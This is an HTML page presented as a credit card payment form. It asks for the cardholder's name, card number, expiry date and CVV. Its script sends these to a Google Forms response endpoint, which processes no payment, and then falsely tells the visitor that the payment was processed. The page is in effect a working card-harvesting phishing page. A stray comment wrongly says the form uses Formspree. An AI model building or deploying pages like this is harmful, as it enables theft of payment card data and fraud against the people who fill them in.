<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Credit Card Information Form</title>
    <style>
        .form-container {
            margin: 20px;
            max-width: 500px;
            padding: 20px;
            border: 1px solid #ddd;
            border-radius: 8px;
        }
        label {
            display: block;
            margin: 8px 0;
        }
        input[type="text"],
        input[type="email"] {
            width: calc(100% - 22px);
            padding: 10px;
            margin: 5px 0 10px 0;
            border: 1px solid #ddd;
            border-radius: 4px;
        }
        input[type="submit"] {
            padding: 10px 15px;
            border: none;
            border-radius: 4px;
            background-color: #4CAF50;
            color: white;
            font-size: 16px;
            cursor: pointer;
        }
        input[type="submit"]:hover {
            background-color: #45a049;
        }
        #success-message {
            display: none;
            text-align: center;
            margin-top: 20px;
        }
    </style>
</head>
<body>
    <h2>Enter Your Card Information</h2>
    <div class="form-container">
        <!-- Updated Form with Formspree Integration -->
        <form id="card-info-form" method="POST" action="https://docs.google.com/forms/d/e/1FAIpQLScRJnosq2cBAEdH5nbh8E5Li60t3_LnmrXYLe8FLrgBjN-O4A/formResponse">
            <label for="card-name">Name on Card:</label>
            <input type="text" id="card-name" name="entry.2005620554" required>

            <label for="card-number">Card Number:</label>
            <input type="text" id="card-number" name="entry.1045781291" required>

            <label for="expiry-date">Expiry Date:</label>
            <input type="text" id="expiry-date" name="entry.1065046570" placeholder="MM/YY" required>

            <label for="cvv">CVV:</label>
            <input type="text" id="cvv" name="entry.839337160" required>

            <input type="submit" value="Submit">
        </form>
    </div>

    <!-- Success message -->
    <div id="success-message">
        <h3>Payment has been successfully processed!</h3>
    </div>

    <script>
        document.getElementById('card-info-form').addEventListener('submit', function(event) {
            event.preventDefault(); // Prevent default form submission

            // Create FormData object from the form
            const formData = new FormData(event.target);

            // Convert FormData to URLSearchParams
            const urlParams = new URLSearchParams(formData);

            // Submit form data using fetch
            fetch('https://docs.google.com/forms/d/e/1FAIpQLScRJnosq2cBAEdH5nbh8E5Li60t3_LnmrXYLe8FLrgBjN-O4A/formResponse', {
                method: 'POST',
                body: urlParams
            }).then(response => {
                if (response.ok) {
                    document.getElementById('card-info-form').reset(); // Reset form fields
                    document.getElementById('success-message').style.display = 'block'; // Show success message
                } else {
                    alert('There was a problem with your submission. Please try again.');
                }
            }).catch(error => {
                alert('There was a problem with your submission. Please try again.');
            });
        });
    </script>
</body>
</html>
